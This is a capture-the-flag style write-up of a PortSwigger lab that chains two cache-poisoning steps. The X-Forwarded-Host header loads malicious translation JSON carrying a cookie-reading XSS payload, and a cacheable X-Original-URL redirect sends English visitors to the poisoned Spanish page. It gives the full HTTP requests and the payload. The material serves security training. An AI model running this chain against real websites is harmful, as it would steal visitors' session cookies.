
# #PortSwigger 


![[Pasted image 20260615091919.png]]


## Lab Description

> This lab is susceptible to web cache poisoning, but only if you construct a complex exploit chain.
> 
> A user visits the home page roughly once a minute and their language is set to English. To solve this lab, poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser.

---
---


## Step 1: Understanding the Vulnerability

**This lab requires a multi-step attack chain:**
1. **Poison the Spanish page** (`/?localized=1` with `lang=es` cookie) using `X-Forwarded-Host` to load malicious JSON from exploit server
2. **Poison a redirect** from English to Spanish using `X-Original-URL: /setlang\es`
3. The victim visits English page → redirected to Spanish page → loads malicious JSON → XSS executes

**Why this works:**
- The translation JSON file is imported from the host specified in `X-Forwarded-Host`
- The DOM-XSS only triggers for non-English languages (Spanish)
- The victim's language is English, so we need to force a redirect to Spanish
- `X-Original-URL` with backslashes triggers a cacheable 302 redirect

---

## Step 2: Reconnaissance

### Step 2.1: Discover Supported Headers

Use **Param Miner** to identify that `X-Forwarded-Host` and `X-Original-URL` are supported.

### Step 2.2: Test X-Forwarded-Host

```
GET /?localized=1 HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: lang=es
X-Forwarded-Host: example.com
```

![[Pasted image 20260615093458.png]]


**Observe:** The JSON file is loaded from `example.com/resources/json/translations.json`

---

## Step 3: Create Malicious JSON on Exploit Server

### Step 3.1: On the Exploit Server

1. Create a file at: `/resources/json/translations.json`
2. Add CORS header: `Access-Control-Allow-Origin: *`
3. Set the body:
```
{
    "en": {
        "name": "English"
    },
    "es": {
        "name": "español",
        "translations": {
            "Return to list": "Volver a la lista",
            "View details": "</a><img src=1 onerror='alert(document.cookie)' />",
            "Description:": "Descripción"
        }
    }
}
```

![[Pasted image 20260615094931.png]]

### Step 3.2: Store the Exploit

Note your exploit server URL:
```
https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

---

## Step 4: Poison the Spanish Page

### Step 4.1: Send Poisoned Request

```
GET /?localized=1 HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: lang=es
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Origin: https://example.com
```

![[Pasted image 20260615095204.png]]
### Step 4.2: Replay Until Cached

Keep sending until `X-Cache: hit`.

---

## Step 5: Find Cacheable Redirect

### Step 5.1: Test X-Original-URL with Backslash

```
GET / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
X-Original-URL: /setlang\es
```

**Response:** `302 Found` redirecting to `/setlang/es`

**This redirect is cacheable** (no `Set-Cookie` header).

---

## Step 6: Poison the English Page Redirect

### Step 6.1: Send Redirect Poison Request

```
GET / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
X-Original-URL: /setlang\es
Origin: https://example.com
```

![[Pasted image 20260615095641.png]]
### Step 6.2: Replay Until Cached

Keep sending until `X-Cache: hit`.

![[Pasted image 20260615095720.png]]


---

## Step 7: The Combined Attack

### Step 7.1: Keep Both Caches Poisoned

You need to maintain **two poisoned caches simultaneously**:
1. **Spanish page** (`/?localized=1` with `lang=es`) -> loads malicious JSON
2. **Redirect** (`/` with `X-Original-URL: /setlang\es`) -> redirects English users to Spanish    

### Step 7.2: Replay Both Requests

Every few seconds, send both requests to keep the caches poisoned:

### Remove Origin Header

Once both are cached, remove the `Origin` header from both requests.

**Request 1 (without cache buster):**
**Request 1 (Spanish page):**
```
GET /?localized=1 HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: lang=es
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

**Request 2 (without cache buster):**
**Request 2 (Redirect):**
```
GET / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
X-Original-URL: /setlang\es
```

---

## Step 8: Verify in Browser

1. Load the English home page
2. You should be redirected to `/setlang/es` then to `/?localized=1` with `lang=es` cookie
3. The malicious JSON is loaded -> `alert(document.cookie)` executes

![[Pasted image 20260615100216.png]]

---

## Step 9: Lab Solved

The victim visits the English home page, gets redirected to Spanish, receives the poisoned Spanish page, and the XSS executes.

![[Pasted image 20260615100650.png]]

---
---
